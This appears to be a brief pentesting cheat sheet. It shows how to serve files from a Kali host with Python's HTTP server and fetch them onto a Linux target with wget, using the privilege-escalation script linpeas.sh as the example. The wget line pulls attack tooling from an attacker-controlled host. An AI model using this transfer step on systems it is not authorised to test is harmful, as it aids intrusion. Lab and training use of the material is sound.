# Usage

## Host a simple HTTP server on Kali  
in /root/  
mkdir transfer  
python3 -m http.server 80  

Copy a file into this /root/transfer/ directory: linpeas.sh

## Linux client to get files from HTTP server
wget http://\<Kali IP address>/\<filename>
  * example: wget http://192.168.57.5/linpeas.sh